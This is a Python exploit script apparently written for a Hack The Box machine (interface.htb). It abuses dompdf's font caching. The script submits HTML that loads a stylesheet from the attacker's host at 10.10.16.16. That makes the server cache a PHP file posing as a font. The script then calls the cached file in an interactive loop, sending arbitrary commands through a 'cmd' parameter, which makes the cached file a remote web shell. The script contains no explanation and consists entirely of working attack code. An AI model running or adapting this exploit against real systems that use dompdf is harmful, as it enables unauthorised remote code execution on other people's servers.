import requests
import hashlib

BASEURL = 'http://prd.m.rendering-api.interface.htb'
DATA = {"html":"<head><link rel=\"stylesheet\" href=\"http://10.10.16.16/font.css\"></head><body>Injesctted Font900id1</body>"}


# PDF request
def request():
    res = requests.post(f'{BASEURL}/api/html2pdf',json=DATA)
    return res.headers['X-Local-Cache']

def get(cmd):
    hash = hashlib.md5('http://10.10.16.16/xfont.php'.encode()).hexdigest()
    fontName = f'xfont_normal_{hash}.php'
    params = {"cmd":cmd}
    res = requests.get(url=f'{BASEURL}/vendor/dompdf/dompdf/lib/fonts/{fontName}',params=params)
    print(res.text)

print("[+] Starting PDF request")
for i in range(1,5):    
    if 'hit' in request():
        break
print("[+] Cache hited")
while True:
    cmd = input('prompt> ')
    get(cmd)


